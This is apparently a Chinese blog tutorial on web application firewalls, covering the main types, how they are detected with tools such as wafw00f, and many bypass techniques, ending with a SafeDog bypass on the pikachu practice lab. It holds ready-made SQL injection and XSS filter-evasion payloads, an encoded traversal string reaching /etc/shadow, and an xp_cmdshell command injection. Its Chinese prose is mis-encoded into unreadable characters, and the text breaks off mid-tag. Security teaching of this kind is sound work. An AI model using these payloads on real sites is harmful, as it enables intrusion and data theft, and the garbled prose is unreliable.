        <content type="html"><![CDATA[<p>æ¥å­¦ä¹ ä¸€ä¸‹wafçš„ç›¸å…³çŸ¥è¯†ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://www.kancloud.cn/noahs/src_hacker/2395057">https://www.kancloud.cn/noahs/src_hacker/2395057</a></p><p><a href="https://xz.aliyun.com/t/12684?time__1311=mqmhDvqIOaGNDQtiQGkIfdAI3GKA9xhD&alichlgref=https://www.google.com/">https://xz.aliyun.com/t/12684?time__1311=mqmhDvqIOaGNDQtiQGkIfdAI3GKA9xhD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><h1 id="wafçš„åˆ†ç±»"><a href="#WAFçš„åˆ†ç±»" class="headerlink" title="WAFçš„åˆ†ç±»"></a>WAFçš„åˆ†ç±»</h1><ol><li>è½¯ä»¶<br>è£…åœ¨ä¸»æœºä¾§(æœåŠ¡å™¨)ä¸Šçš„è½¯ä»¶,å¦‚å®‰å…¨ç‹—ã€Dç›¾ã€äº‘é”ç­‰ã€‚</li><li>ç¡¬ä»¶<br>è£…åœ¨ä¼ä¸šé“¾è·¯ä¸Šçš„,æ‰€æœ‰æµé‡éƒ½è¦è¿›è¿‡çš„ç¡¬ä»¶ï¼Œä¸€èˆ¬ç”±å‚å•†å®‰è£…ï¼Œå…¶ä¸²è”åœ¨å†…ç½‘äº¤æ¢æœºï¼Œé˜²æŠ¤èŒƒå›´å¤§ã€‚</li><li>äº‘waf<br>é€šè¿‡DNSè§£æåˆ°äº‘WAFï¼Œè®¿é—®ç½‘ç«™çš„æµé‡è¦ç»è¿‡æŒ‡å®šçš„DNSæœåŠ¡å™¨è§£æï¼Œç„¶åè¿›å…¥WAFèŠ‚ç‚¹è¿›è¡Œè¿‡æ»¤ï¼Œæœ€åè®¿é—®åŸå§‹æœåŠ¡å™¨ï¼Œå¦‚é˜¿é‡Œäº‘ã€è…¾è®¯äº‘ä¹‹ç±»ã€‚</li></ol><h1 id="wafå·¥ä½œåŸç†"><a href="#WAFå·¥ä½œåŸç†" class="headerlink" title="WAFå·¥ä½œåŸç†"></a>WAFå·¥ä½œåŸç†</h1><p>å¤„ç†æµç¨‹å¤§è‡´åˆ†ä¸ºå››éƒ¨åˆ†ï¼šé¢„å¤„ç†ã€è§„åˆ™æ£€æµ‹ã€å¤„ç†æ¨¡å—ã€æ—¥å¿—è®°å½•</p><p><strong>é¢„å¤„ç†</strong></p><p>æ¥æ”¶åˆ°æ•°æ®è¯·æ±‚æµé‡æ—¶ï¼Œå…ˆåˆ¤æ–­è¯¥è¯·æ±‚æ˜¯å¦ç™½åå•ï¼Œå¦‚æœåœ¨ç™½åå•å†…ç›´æ¥äº¤ç»™æœåŠ¡å™¨å“åº”ï¼Œå¦åˆ™è§£æåè¿›å…¥åˆ°è§„åˆ™æ£€æµ‹ã€‚</p><p><strong>è§„åˆ™æ£€æµ‹</strong></p><p>æ•°æ®è§£æåå°±ä¼šè¿›å…¥åˆ°WAFçš„æ£€æµ‹ä½“ç³»ä¸­è¿›è¡Œè§„åˆ™åŒ¹é…ï¼Œæ£€æŸ¥æ˜¯å¦ç¬¦åˆè¦æ±‚ã€‚</p><p><strong>å¤„ç†æ¨¡å—</strong></p><p>é’ˆå¯¹æ£€æµ‹ç»“æœï¼Œç¬¦åˆè¦æ±‚çš„å°±äº¤ç»™åç«¯å“åº”ï¼Œä¸ç¬¦åˆçš„åˆ™ä¼šæ‰§è¡Œç›¸å…³çš„é˜²å¾¡åŠ¨ä½œï¼Œæ¯”å¦‚ï¼šé˜»æ–­ã€è®°å½•ã€å‘Šè­¦ç­‰ã€‚</p><p>ä¸åŒçš„WAFäº§å“ä¼šè‡ªå®šä¹‰ä¸åŒçš„æ‹¦æˆªè­¦å‘Šé¡µé¢ï¼Œåœ¨æ—¥å¸¸æ¸—é€ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥æ ¹æ®ä¸åŒçš„æ‹¦æˆªé¡µé¢æ¥è¾¨åˆ«å‡ºç½‘ç«™ä½¿ç”¨äº†å“ªæ¬¾WAFäº§å“ï¼Œä»è€Œæœ‰ç›®çš„æ€§çš„è¿›è¡ŒWAFç»•è¿‡ã€‚</p><p>è¿™ç¯‡æ–‡ç« æœ‰å¸¸è§çš„WAFäº§å“çš„ç•Œé¢ï¼š<a href="https://cloud.tencent.com/developer/article/1872310">https://cloud.tencent.com/developer/article/1872310</a></p><p><strong>æ—¥å¿—è®°å½•</strong></p><p>å³è®°å½•ä¸‹æ‹¦æˆªå¤„ç†çš„æ—¥å¿—ã€‚</p><h1 id="wafçš„åˆ¤æ–­"><a href="#WAFçš„åˆ¤æ–­" class="headerlink" title="WAFçš„åˆ¤æ–­"></a>WAFçš„åˆ¤æ–­</h1><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>ç½‘ç«™æœ‰wafçš„è¯ï¼Œsqlmapåœ¨è¿›è¡Œæ‰«æé‡åˆ°wafçš„æ—¶å€™ä¹Ÿä¼šæœ‰æç¤ºã€‚</p><h2 id="wafw00f"><a href="#Wafw00f" class="headerlink" title="Wafw00f"></a>Wafw00f</h2><p>è¿™æ˜¯kaliä¸‹è‡ªå¸¦çš„ä¸€ä¸ªwafæ£€æµ‹å·¥å…·,æ¯”å¦‚è¿™é‡Œæ¢æµ‹ä¸€ä¸‹baidu</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wafw00f www.baidu.com<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151445867.png" alt="image-20240422134538639"></p><h2 id="æ‰‹åŠ¨æµ‹è¯•"><a href="#æ‰‹åŠ¨æµ‹è¯•" class="headerlink" title="æ‰‹åŠ¨æµ‹è¯•"></a>æ‰‹åŠ¨æµ‹è¯•</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ†æhttpè¯·æ±‚å“åº”æŠ¥æ–‡çš„X-Powered-Byå­—æ®µï¼Œæ¯”å¦‚ä»–å¯èƒ½æ˜¾ç¤ºanyu.qianxin.comï¼Œé‚£ä¹ˆç”¨çš„å°±æ˜¯å¥‡å®‰ä¿¡çš„WAFã€‚</p><h2 id="æ¶æ„å­—ç¬¦æˆ–è€…æ•æ„Ÿé¡µé¢æµ‹è¯•"><a href="#æ¶æ„å­—ç¬¦æˆ–è€…æ•æ„Ÿé¡µé¢æµ‹è¯•" class="headerlink" title="æ¶æ„å­—ç¬¦æˆ–è€…æ•æ„Ÿé¡µé¢æµ‹è¯•"></a>æ¶æ„å­—ç¬¦æˆ–è€…æ•æ„Ÿé¡µé¢æµ‹è¯•</h2><p>æ¯”å¦‚ä¸€äº›sqlæ³¨å…¥çš„è¯­å¥æˆ–è€…ä¸€äº›å‘½ä»¤æ‰§è¡Œå­—ç¬¦ï¼Œæˆ–è€…è®¿é—®ä¸€äº›æ•æ„Ÿé¡µé¢ï¼Œçœ‹çœ‹æ˜¯å¦ä¼šå‡ºç°é˜²ç«å¢™çš„æ‹¦æˆªé¡µé¢ã€‚</p><h1 id="wafçš„ç»•è¿‡"><a href="#WAFçš„ç»•è¿‡" class="headerlink" title="WAFçš„ç»•è¿‡"></a>WAFçš„ç»•è¿‡</h1><h2 id="æ£€æµ‹è§„åˆ™ç»•è¿‡"><a href="#æ£€æµ‹è§„åˆ™ç»•è¿‡" class="headerlink" title="æ£€æµ‹è§„åˆ™ç»•è¿‡"></a>æ£€æµ‹è§„åˆ™ç»•è¿‡</h2><h3 id="ä¿®æ”¹è¯·æ±‚æ–¹å¼ç»•è¿‡"><a href="#ä¿®æ”¹è¯·æ±‚æ–¹å¼ç»•è¿‡" class="headerlink" title="ä¿®æ”¹è¯·æ±‚æ–¹å¼ç»•è¿‡"></a>ä¿®æ”¹è¯·æ±‚æ–¹å¼ç»•è¿‡</h3><p>æœ€å…¸å‹çš„ä¿®æ”¹è¯·æ±‚æ–¹å¼ç»•è¿‡ï¼Œå¾ˆå¤šçš„aspï¼Œaspxç½‘ç«™éƒ½å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œæœ‰æ—¶å€™WAFå¯¹GETè¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†æ˜¯Cookieç”šè‡³POSTå‚æ•°å´æ²¡æœ‰æ£€æµ‹ã€‚</p><h3 id="å¤å‚æ•°ç»•è¿‡"><a href="#å¤å‚æ•°ç»•è¿‡" class="headerlink" title="å¤å‚æ•°ç»•è¿‡"></a>å¤å‚æ•°ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#ä¾‹å¦‚ä¸€ä¸ªè¯·æ±‚æ˜¯è¿™æ ·çš„<br>GET /pen/news.php?id=1 union select user,password from mysql.user<br>#å¯ä»¥ä¿®æ”¹ä¸º<br>GET pen/news.php?id=1&amp;id=union&amp;id=select&amp;id=user,password&amp;id=from%20mysql.user<br></code></pre></td></tr></table></figure><h3 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">id=1 UnIon SelECt 1<br></code></pre></td></tr></table></figure><h3 id="urlç¼–ç ç»•è¿‡"><a href="#URLç¼–ç ç»•è¿‡" class="headerlink" title="URLç¼–ç ç»•è¿‡"></a>URLç¼–ç ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">è¢«WAFé˜»æ­¢ï¼šUniOn(SeLeCt 1,2,3,4,5,6,7,8,9,10)ç»•è¿‡çš„æŠ€æœ¯ï¼šUniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29<br></code></pre></td></tr></table></figure><h3 id="unicodeæŠ€æœ¯"><a href="#UnicodeæŠ€æœ¯" class="headerlink" title="UnicodeæŠ€æœ¯"></a>UnicodeæŠ€æœ¯</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">../../etc/shadowæ··æ·†ï¼š<br>%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow<br></code></pre></td></tr></table></figure><p>è¯¥æŠ€æœ¯å¯ä»¥å‚è€ƒä¸€ä¸‹pç¥æœ€æ–°çš„æ–‡ç« ï¼š<a href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html">https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html</a></p><p>è¿™é‡Œè´´ä¸€ä¸‹unicodeè½¬UTF-8çš„è½¬æ¢è¡¨</p><p><img src="http://cdn.clown2024.cn/202407151445868.png" alt="image-20240422160514001"></p><p>æ€»ç»“ä¸‹å¤§æ¦‚å°±æ˜¯æ­£å¸¸unicodeç¼–ç çš„.åº”è¯¥æ˜¯\u2e,æ˜¯æ— æ³•è½¬æ¢æˆä¸¤å­—èŠ‚UTF-8ç¼–ç çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç»™ä»–å‰é¢è¡¥0ï¼Œç„¶ååˆ†æˆ5ä½å’Œ6ä½ä¸¤ç»„ï¼Œ00000ã€101110ï¼Œç„¶ååˆ†åˆ«ç»™è¿™ä¸¤ç»„åŠ å‰ç¼€110ã€10ï¼Œè¿™æ ·å¯¹åº”å°±æ˜¯\xC0\xAEã€‚</p><p>ä½†æ˜¯è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„UTF-8å­—ç¬¦ï¼Œæœ‰äº›è¯­è¨€åœ¨è½¬æ¢æ—¶å°±ä¼šå‡ºé”™ï¼Œæ¯”å¦‚pythonï¼Œä½†æ˜¯javaå°±ä¸ä¼šï¼Œjavaå­˜åœ¨è¿™ä¸ªè§£æç¼ºé™·ï¼Œæ‰€ä»¥å¯ä»¥é€ æˆè·¯å¾„ç©¿è¶Šã€‚</p><p>å…¶ä»–çš„å­—ç¬¦ä¹ŸåŒç†ï¼Œè¿™é‡Œè´´ä¸€ä¸‹å„å­—ç¬¦çš„è½¬æ¢</p><p><strong>Unicodeçš„URLç¼–ç </strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">. = %u002e<br>/ = %u2215<br>\ = %u2216<br></code></pre></td></tr></table></figure><p><strong>UTF-8çš„Unicodeç¼–ç </strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">. = %c0%2e, %e0%40%ae, %c0ae<br>/ = %c0%af, %e0%80%af, %c0%2f<br>\ = %c0%5c, %c0%80%5c<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯pç¥çš„asciiè½¬æ¢æˆOverlong Encodingçš„UTF-8ç¼–ç è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_int</span>(<span class="hljs-params">i: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    b1 = ((i &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0b11111</span>) | <span class="hljs-number">0b11000000</span><br>    b2 = (i &amp; <span class="hljs-number">0b111111</span>) | <span class="hljs-number">0b10000000</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([b1, b2])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_str</span>(<span class="hljs-params">s: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    bs = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> s.encode():<br>        bs += convert_int(ch)<br><br>    <span class="hljs-keyword">return</span> bs<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(convert_str(<span class="hljs-string">&#x27;.&#x27;</span>)) <span class="hljs-comment"># b&#x27;\xc0\xae&#x27;</span><br>    <span class="hljs-built_in">print</span>(convert_str(<span class="hljs-string">&#x27;org.example.Evil&#x27;</span>)) <span class="hljs-comment"># b&#x27;\xc1\xaf\xc1\xb2\xc1\xa7\xc0\xae\xc1\xa5\xc1\xb8\xc1\xa1\xc1\xad\xc1\xb0\xc1\xac\xc1\xa5\xc0\xae\xc1\x85\xc1\xb6\xc1\xa9\xc1\xac&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="ç‰¹æ®Šå­—ç¬¦æ›¿æ¢"><a href="#ç‰¹æ®Šå­—ç¬¦æ›¿æ¢" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦æ›¿æ¢"></a>ç‰¹æ®Šå­—ç¬¦æ›¿æ¢</h3><p>ç”¨ä¸€äº›ç‰¹æ®Šå­—ç¬¦æ›¿æ¢ç©ºæ ¼ï¼Œæ¯”å¦‚mysqlä¸­çš„%0aæ˜¯æ¢è¡Œï¼Œå¯ä»¥ç”¨æ¥ä»£æ›¿ç©ºæ ¼ï¼Œè¿˜æœ‰å†…è”æ³¨é‡Š&#x2F;**&#x2F;æ›¿æ¢ç©ºæ ¼ç­‰ç­‰</p><p>è¿˜æœ‰%23ä¸º#å·ç”¨æ¥æ³¨é‡Šç­‰ç­‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#åŸæ³¨å…¥è¯­å¥<br>xxx/sql.php/id=1 union select 1,user(),3,4,5<br>#æ··ç”¨å<br>xxx/sql.php?id=1/*|%23--%23|*/union/*|%23--%23|*/select/*|%23--%23|*/1,user(),3,4,5<br>xxx/sql.php?id=1/*|%23--%23|*/and/*|%23--%23|*/1=2<br></code></pre></td></tr></table></figure><h3 id="ç‰¹æ®Šå­—ç¬¦æ‹¼æ¥"><a href="#ç‰¹æ®Šå­—ç¬¦æ‹¼æ¥" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦æ‹¼æ¥"></a>ç‰¹æ®Šå­—ç¬¦æ‹¼æ¥</h3><p>æŠŠç‰¹æ®Šå­—ç¬¦æ‹¼æ¥èµ·æ¥ç»•è¿‡WAFçš„æ£€æµ‹ï¼Œæ¯”å¦‚åœ¨mssqlä¸­ï¼Œå‡½æ•°é‡Œé¢å¯ä»¥ç”¨+æ¥æ‹¼æ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#å¦‚ï¼š<br>GET /pen/news.php?id=1;exec(masterâ€¦xp_cmdshell â€˜net userâ€™)<br>#å¯ä»¥æ”¹ä¸ºï¼š<br>GET /pen/news.php?id=1;exec(â€˜masteâ€™+â€˜râ€¦xpâ€™+â€™_cmdshellâ€™+â€™â€œnet userâ€â€™)<br></code></pre></td></tr></table></figure><h3 id="æ³¨é‡ŠåŒ…å«å…³é”®è¯"><a href="#æ³¨é‡ŠåŒ…å«å…³é”®è¯" class="headerlink" title="æ³¨é‡ŠåŒ…å«å…³é”®è¯"></a>æ³¨é‡ŠåŒ…å«å…³é”®è¯</h3><p>åœ¨mysqlä¸­ï¼Œå¯ä»¥åˆ©ç”¨<code>/!/</code>åŒ…å«å…³é”®è¯è¿›è¡Œç»•è¿‡ï¼Œåœ¨mysqlä¸­è¿™ä¸ªä¸æ˜¯æ³¨é‡Šï¼Œè€Œæ˜¯å–æ¶ˆæ³¨é‡Šçš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">GET /pen/news.php?id=1 union select user,password from mysql.user<br>#å¯ä»¥æ”¹ä¸º: <br>GET /pen/news.php?id=1 /!union/ /!select/ user,password /!from/ mysql.user<br></code></pre></td></tr></table></figure><h3 id="å…³é”®è¯æ›¿æ¢"><a href="#å…³é”®è¯æ›¿æ¢" class="headerlink" title="å…³é”®è¯æ›¿æ¢"></a>å…³é”®è¯æ›¿æ¢</h3><p>æœ‰äº›wafä¼šæŠŠå…³é”®è¯æ›¿æ¢ä¸ºâ€™â€™ï¼Œè¿™æ ·å°±å¯ä»¥åŒå†™ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">xxx/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4â€¦.<br>#æ­¤æ–¹æ³•é€‚ç”¨äºä¸€äº›ä¼šæŠŠunion selectæ›¿æ¢æ‰çš„WAFï¼Œç»è¿‡WAFè¿‡æ»¤åå°±ä¼šå˜æˆ<br>union select 1,2,3,4....<br></code></pre></td></tr></table></figure><h3 id="ç¼–ç ä¸æ³¨é‡Šç»“åˆ"><a href="#ç¼–ç ä¸æ³¨é‡Šç»“åˆ" class="headerlink" title="ç¼–ç ä¸æ³¨é‡Šç»“åˆ"></a>ç¼–ç ä¸æ³¨é‡Šç»“åˆ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">xxx/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4â€¦<br>xxx/sql.php?id=1/*!50000*/union/*!50000*/select/*!50000*/1,user(),3,4,5<br>xxx/sqli/Less-1/?id=1&#x27; and /*!1=1*/ %23 (WAFä¸æ‹¦æˆª)<br><br>&lt;script&gt;confirm()&lt;/script&gt;<br>ç»•è¿‡çš„æŠ€æœ¯ï¼š&lt;!--&gt;&lt;script&gt;confirm/**/()/**/&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ç”¨sqlmapçš„è„šæœ¬å®ç°è‡ªåŠ¨æ³¨å…¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sqlmap.py -u &quot;URL&quot; --tamper=&quot;versionedmorekeywords.py&quot; --dealy=1<br></code></pre></td></tr></table></figure><h3 id="è¯­å¥æ›¿æ¢"><a href="#è¯­å¥æ›¿æ¢" class="headerlink" title="è¯­å¥æ›¿æ¢"></a>è¯­å¥æ›¿æ¢</h3><p>å°±æ˜¯æ‰¾ä¸€äº›å…¶ä»–å…·æœ‰åŒç­‰æ•ˆæœçš„å‘½ä»¤æˆ–è€…å˜é‡è¿›è¡Œæ›¿æ¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">@@version ä»£æ›¿å“ version()<br>concat() ä»£æ›¿å“ concat_ws()<br>group_concat() ä»£æ›¿å“ concat_ws()<br>= ä»£æ›¿å“ like<br><br>#è¿˜æœ‰å°±æ˜¯æŠŠor &#x27;1=1&#x27; æ”¹æˆæ›´å¤æ‚çš„å¦‚-1=-1**<br></code></pre></td></tr></table></figure><h3 id="å®½å­—èŠ‚ç»•è¿‡"><a href="#å®½å­—èŠ‚ç»•è¿‡" class="headerlink" title="å®½å­—èŠ‚ç»•è¿‡"></a>å®½å­—èŠ‚ç»•è¿‡</h3><p>è¿™æ˜¯gbkå’Œutf-8å¯¼è‡´çš„ç¼–ç è½¬æ¢é—®é¢˜ï¼Œgbkæ˜¯ç”¨å›ºå®šçš„ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªæ±‰å­—ï¼Œç¼–ç èŒƒå›´ä¸ºï¼šç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ï¼ˆ129-254ï¼‰ï¼Œç¬¬äºŒä¸ªå­—èŠ‚ï¼ˆ64-254ï¼‰ï¼Œå½“ä¸ºgbkç¼–ç æ—¶é‡åˆ°è¿ç»­çš„ä¸¤ä¸ªç¬¦åˆå­—èŠ‚èŒƒå›´çš„å­—èŠ‚ï¼Œå°±ä¼šè‡ªåŠ¨è§£æä¸ºä¸€ä¸ªæ±‰å­—</p><p>æ¯”å¦‚ï¼šphpçš„addslasheså‡½æ•°ä¸ºäº†é˜²æ­¢sqlæ³¨å…¥ä¼šå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œè½¬ä¹‰ï¼Œæ¯”å¦‚**â€™â€“&gt;\â€˜**ï¼Œè®©å•å¼•å·å¤±å»ä½œç”¨</p><p>è¿™æ—¶å€™å°±å¯ä»¥ç”¨å®½å­—èŠ‚ç»•è¿‡ï¼Œ\â€˜çš„ç¼–ç ä¸º%5C%27ï¼Œæˆ‘ä»¬åªè¦è¾“å…¥%df%27ï¼Œ%dfå°±ä¼šå’Œ%5Cç»„åˆæˆä¸¤ä¸ªç¬¦åˆgbkç¼–ç èŒƒå›´çš„å­—èŠ‚ï¼Œå°±ä¼šè§£ææˆä¸ºä¸€ä¸ªæ±‰å­—ï¼Œå› ä¸º%5cçš„ç¼–ç ä½æ•°ä¸º92ï¼Œ%dfçš„ç¼–ç ä½æ•°ä¸º223ï¼Œ%df%5cç¬¦åˆgbkå–å€¼èŒƒå›´ï¼Œè¿™æ ·\å°±ä¼šå¤±å»ä»–çš„è½¬ä¹‰ä½œç”¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">union = uÑ%69ÑÑè¿™é‡ŒæŠŠiä¸ç”¨å®½å­—èŠ‚ ç›´æ¥urlç¼–ç  å…¶ä»–çš„å­—ç¬¦éƒ½ç”¨å¯¹åº”çš„å®½å­—èŠ‚<br>select = ã“Ñ…lÑ…%Ñƒt //tä¸ç¼–ç  å…¶ä»–çš„éƒ½å®½å­—èŠ‚ ä¸­é—´æ’ä¸Š%<br>from = Ñ†R%ÑÑ //å®½å­—èŠ‚+%<br>ç©ºæ ¼=%20=%Ğ²Ğ° //Ğ²æ˜¯2çš„æ¬¾å­—ç¬¦ Ğ°æ˜¯0çš„å®½å­—ç¬¦<br>, = Ğ¬ //,å·çš„å®½å­—èŠ‚<br></code></pre></td></tr></table></figure><h3 id="00æˆªæ–­ç»•è¿‡"><a href="#00æˆªæ–­ç»•è¿‡" class="headerlink" title="00æˆªæ–­ç»•è¿‡"></a>00æˆªæ–­ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">id=1%00and 1=2 union select 1,2,column_name from information_schema.columns<br></code></pre></td></tr></table></figure><h3 id="æº¢å‡ºwafç»•è¿‡"><a href="#æº¢å‡ºwafç»•è¿‡" class="headerlink" title="æº¢å‡ºwafç»•è¿‡"></a>æº¢å‡ºwafç»•è¿‡</h3><p>å°±æ˜¯è„æ•°æ®ç»•è¿‡ï¼Œæ·»åŠ ä¸€äº›æ— ç”¨çš„å­—ç¬¦å»ç»•è¿‡æ£€æµ‹ï¼Œå› ä¸ºæœ‰äº›wafåªæ£€æµ‹å›ºå®šé•¿åº¦çš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?id=1+and+sleep(3) <br>ç»•è¿‡payload:<br>?id=1+and+sleep(3)+and+111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111<br></code></pre></td></tr></table></figure><h3 id="åè®®æœªè¦†ç›–ç»•è¿‡"><a href="#åè®®æœªè¦†ç›–ç»•è¿‡" class="headerlink" title="åè®®æœªè¦†ç›–ç»•è¿‡"></a>åè®®æœªè¦†ç›–ç»•è¿‡</h3><p>æ¯”å¦‚ä¸‹é¢æ˜¯å››ç§Content-Typeç±»å‹</p><ul><li>Content-Type:multipart&#x2F;form-data;</li><li>Content-Type:application&#x2F;x-www-form-urlencoded</li><li>Content-Type: text&#x2F;xml</li><li>Content-Type: application&#x2F;json</li></ul><p>æœ‰äº›wafåªé’ˆå¯¹äº†ä¸€ç§è¿›è¡Œè¿‡æ»¤ï¼Œè€Œå¿½ç•¥äº†å…¶ä»–çš„ç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥æ›¿æ¢ç€å»å°è¯•ä¸€ä¸‹ç»•è¿‡ã€‚</p><h2 id="åˆ†å—ä¼ è¾“ç»•è¿‡"><a href="#åˆ†å—ä¼ è¾“ç»•è¿‡" class="headerlink" title="åˆ†å—ä¼ è¾“ç»•è¿‡"></a>åˆ†å—ä¼ è¾“ç»•è¿‡</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://forum.butian.net/share/1982">https://forum.butian.net/share/1982</a></p><h3 id="åˆ†å—ä¼ è¾“ä»‹ç»"><a href="#åˆ†å—ä¼ è¾“ä»‹ç»" class="headerlink" title="åˆ†å—ä¼ è¾“ä»‹ç»"></a>åˆ†å—ä¼ è¾“ä»‹ç»</h3><p>åˆ†å—ä¼ è¾“ç¼–ç æ˜¯è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼ˆHTTPï¼‰ä¸­çš„ä¸€ç§æ•°æ®ä¼ è¾“æœºåˆ¶ï¼Œå…è®¸HTTPç”±åº”ç”¨æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€çš„æ•°æ®åˆ†æˆå¤šä¸ªéƒ¨åˆ†ï¼Œåœ¨æ¶ˆæ¯å¤´ä¸­æŒ‡å®š Transfer-Encoding: chunked å°±è¡¨ç¤ºæ•´ä¸ªresponseå°†ä½¿ç”¨åˆ†å—ä¼ è¾“ç¼–è¯‘æ¥ä¼ è¾“å†…å®¹ã€‚ä¸€ä¸ªæ¶ˆæ¯å—ç”±nå—ç»„æˆï¼Œå¹¶åœ¨æœ€åä¸€ä¸ªå¤§å°ä¸º0çš„å—ç»“æŸã€‚</p><p>è¿™æ˜¯ä¸€å¼ ä¼ è¾“æµç¨‹å›¾ï¼›</p><p><img src="http://cdn.clown2024.cn/202407151445869.png" alt="image-20240422230718168"></p><h3 id="å®‰å…¨ç‹—åˆ†å—ä¼ è¾“ç»•è¿‡"><a href="#å®‰å…¨ç‹—åˆ†å—ä¼ è¾“ç»•è¿‡" class="headerlink" title="å®‰å…¨ç‹—åˆ†å—ä¼ è¾“ç»•è¿‡"></a>å®‰å…¨ç‹—åˆ†å—ä¼ è¾“ç»•è¿‡</h3><p>è¿™é‡Œä½¿ç”¨å®‰å…¨ç‹—å’Œpikachué¶åœºç¯å¢ƒæ¥è¿›è¡Œå­¦ä¹ </p><p><strong>sqlæ³¨å…¥</strong></p><p>è¿™é‡Œæ¼”ç¤ºä¸€ä¸‹å®‰å…¨ç‹—bypass sqlæ³¨å…¥ï¼Œé€‰ç”¨pikachué¶åœºçš„ç¬¬ä¸€ä¸ªæ•°å­—å‹æ³¨å…¥</p><p><img src="http://cdn.clown2024.cn/202407151445870.png" alt="image-20240423155829763"></p><p>ä»–è¿™é‡Œæ˜¯ä½¿ç”¨postä¼ å‚çš„ï¼Œè¿™é‡Œæˆ‘ä»¬å°è¯•æŸ¥è¯¢</p><p>å…ˆæŸ¥è¯¢æ­£å¸¸æ•°æ®</p><p><img src="http://cdn.clown2024.cn/202407151445871.png" alt="image-20240423160031061"></p><p>ç„¶åæŸ¥è¯¢ä¸€ä¸‹æ•æ„Ÿæ•°æ®</p><p><img src="http://cdn.clown2024.cn/202407151445872.png" alt="image-20240423160100271"></p><p>æŒºç¦»è°±çš„å®‰å…¨ç‹—é¡µé¢éƒ½ä¸å¼¹ç›´æ¥ç»™æˆ‘500.ã€‚ã€‚ã€‚</p><p>ä¸€å¼€å§‹ä»¥ä¸ºæœåŠ¡å™¨æœ‰é—®é¢˜ï¼Œå†å»çœ‹äº†ä¸€ä¸‹æ˜¯æœ‰æ‹¦æˆªæ—¥å¿—çš„</p><p><img src="http://cdn.clown2024.cn/202407151445873.png" alt="image-20240423160205769"></p><p>ç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨burpçš„ä¸€ä¸ªåˆ†å—ä¼ è¾“æ’ä»¶è¿›è¡Œç¼–ç </p><p><img src="http://cdn.clown2024.cn/202407151445874.png" alt="image-20240423160247835"></p><p><img src="http://cdn.clown2024.cn/202407151445875.png" 